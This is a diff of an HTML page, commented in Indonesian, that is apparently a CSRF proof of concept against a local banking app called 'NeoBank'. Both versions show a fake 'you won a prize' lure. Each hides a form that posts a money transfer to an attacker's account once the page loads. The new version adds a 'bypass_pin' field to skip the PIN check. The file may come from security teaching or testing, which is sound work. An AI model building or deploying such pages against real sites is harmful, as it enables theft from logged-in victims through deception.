@@ -1,31 +1,28 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
-    <title>Situs Hadiah Gratis!</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Win Free Prize!</title>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-md text-center">
-        <h1 class="text-3xl font-bold text-red-600 mb-4">SELAMAT!</h1>
-        <p class="text-gray-600 mb-6">Anda memenangkan <strong>iPhone 15 Pro Max!</strong><br>Silakan tunggu sementara kami memproses klaim Anda...</p>
-        
-        <!-- Loading Spinner -->
-        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-indigo-600 mx-auto"></div>
 
-        <!-- Hidden Form Exploitation -->
-        <form id="exploitForm" action="../dashboard.php" method="POST" style="display:none;">
-            <input type="hidden" name="to_username" value="attacker">
-            <input type="hidden" name="amount" value="500">
-            <input type="hidden" name="transfer" value="1">
-        </form>
+<body onload="document.forms[0].submit()">
+    <h1>Selamat! Anda Memenangkan Hadiah Utama!</h1>
+    <p>Mohon tunggu sebentar, sistem sedang memproses pengiriman hadiah Anda...</p>
 
-        <script>
-            // Submit form secara otomatis saat halaman dimuat
-            setTimeout(function() {
-                document.getElementById('exploitForm').submit();
-            }, 2000); // Delay 2 detik agar korban sempat baca "Hadiah"
-        </script>
-    </div>
+    <!-- CSRF Exploit Form -->
+    <form action="http://localhost:8000/transfer.php" method="POST" style="display:none;">
+        <!-- Rekening Attacker -->
+        <input type="hidden" name="to_account" value="0987654321">
+        <!-- Nominal Transfer -->
+        <input type="hidden" name="amount" value="5000000">
+        <!-- BYPASS PIN: Mengeksploitasi celah logic bypass -->
+        <input type="hidden" name="bypass_pin" value="1">
+    </form>
+
+    <script>
+        // Form akan terkirim otomatis saat halaman dibuka oleh Victim yang sedang login di NeoBank
+    </script>
 </body>
+
 </html>
